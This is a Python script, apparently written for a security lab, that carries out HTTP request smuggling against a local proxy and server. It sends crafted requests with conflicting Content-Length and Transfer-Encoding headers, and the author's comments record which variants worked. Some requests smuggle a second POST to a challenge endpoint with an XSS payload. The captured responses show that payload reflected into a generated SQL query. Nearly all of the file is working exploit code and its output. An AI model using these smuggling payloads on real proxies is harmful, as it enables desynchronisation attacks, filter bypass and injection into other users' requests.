#!/usr/bin/env python3
# -*- coding: utf-8 -*-

###################
#    This file implements the smuggling attack for the lab
#    Copyright (C) 2026  Maurice Lambert

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
##################

from socket import socket

# working good
s = socket()
s.connect(("127.0.0.1", 8000))
s.sendall(b'''POST /proxy?path=/demo1/login HTTP/1.1\r
Host: good.bad\r
Content-Length: 13\r
\r
0\r
\r
SMUGGLED''')
r = s.recv(4096)
s.close()
r

# working good
s = socket()
s.connect(("127.0.0.1", 8000))
s.sendall(b'''POST /proxy?path=/demo1/login HTTP/1.1\r
Host: good.bad\r
Content-Length: 5\r
Transfer-Encoding: chunked\r
\r
0\r
\r
''')
r = s.recv(4096)
s.close()
r

# 502 Bad Gateway: [WinError 10053] Une connexion établie a été abandonnée par un logiciel de votre ordinateur hôte
# Server close socket
# Socket proxy to server close
s = socket()
s.connect(("127.0.0.1", 8000))
s.sendall(b'''POST /proxy?path=/demo1/login HTTP/1.1\r
Host: good.bad\r
Content-Length: 3\r
Transfer-Encoding: chunked\r
\r
8\r
SMUGGLED\r
0\r
\r
''')
r = s.recv(4096)
s.close()
r

# timeout
s = socket()
s.connect(("127.0.0.1", 8000))
s.sendall(b'''POST /proxy?path=/demo1/login HTTP/1.1\r
Host: good.bad\r
Content-Length: 13\r
Transfer-Encoding: chunked\r
\r
0\r
\r
SMUGGLED''')
r = s.recv(4096)
s.close()
r

s = socket()
s.connect(("127.0.0.1", 8000))
s.sendall(b'''POST /proxy?path=/demo1/login HTTP/1.1\r
Host: good.bad\r
Content-Length: 4\r
Transfer-Encoding: chunked\r
\r
58\r
POST /challenge7 HTTP/1.1\r\nHost: good.bad\r\nContent-Length: 7\r\nConnection: keep-alive\r\n\r\n\r
0\r
\r
''')
r = s.recv(4096)
s.close()
r

s = socket()
s.connect(("127.0.0.1", 8000))
s.sendall(b'''POST /proxy?path=/demo1/login HTTP/1.1\r
Host: good.bad\r
Content-Length: 1\r
\r
1''')
r = s.recv(4096)
s.close()
r

s = socket()
s.connect(("127.0.0.1", 8000))
s.sendall(b'''POST /proxy?path=/demo1/login HTTP/1.1\r
Host: good.bad\r
Content-Length: 4\r
Transfer-Encoding: chunked\r
\r
8a\r
POST /challenge7 HTTP/1.1\r\nHost: good.bad\r\nContent-Length: 56\r\nConnection: keep-alive\r\n\r\nname=alice%3Cscript%3Ealert%281%29%3C%2Fscript%3E\r
0\r
\r
''')
r = s.recv(4096)
s.close()
r

exit()
# b'HTTP/1.1 302 Found\r\nServer: BaseHTTP/0.6 Python/3.14.2\r\nDate: Tue, 22 Sep 2026 15:28:41 GMT\r\nServer: BaseHTTP/0.6 Python/3.14.2\r\nDate: Tue, 22 Sep 2026 15:28:41 GMT\r\nLocation: /demo1/messages\r\nSet-Cookie: user=Z3Vlc3Q=; Path=/\r\nContent-Length: 0\r\n\r\n'

s = socket()
s.connect(("127.0.0.1", 8000))
s.sendall(b'''POST /proxy?path=/demo1/login HTTP/1.1\r
Host: good.bad\r
Content-Length: 1\r
\r
1''')
r = s.recv(4096)
print(r)
r = s.recv(4096)
s.close()
r

# b'HTTP/1.1 200 OK\r\nServer: BaseHTTP/0.6 Python/3.14.2\r\nDate: Tue, 22 Sep 2026 15:29:11 GMT\r\nServer: BaseHTTP/0.6 Python/3.14.2\r\nDate: Tue, 22 Sep 2026 15:28:41 GMT\r\nContent-type: text/html; charset=utf-8\r\nContent-Length: 516\r\n\r\n'
# b'\n        <html>\n        <body style="font-family: monospace">\n\n        <h1>Challenge 7 - SQL Injection</h1>\n\n        <form method="POST" action="/challenge7">\n            Search user :\n            <input name="name" value="alice">\n            <button>Search</button>\n        </form>\n\n        <hr>\n\n        <h2>Generated query</h2><pre>SELECT username,password FROM users WHERE username LIKE \'%alice<script>alert(1)</script>\r\n0\r\n\r\n%\';</pre><h2>Result</h2><pre>No result</pre>\n\n        </body>\n        </html>\n        '
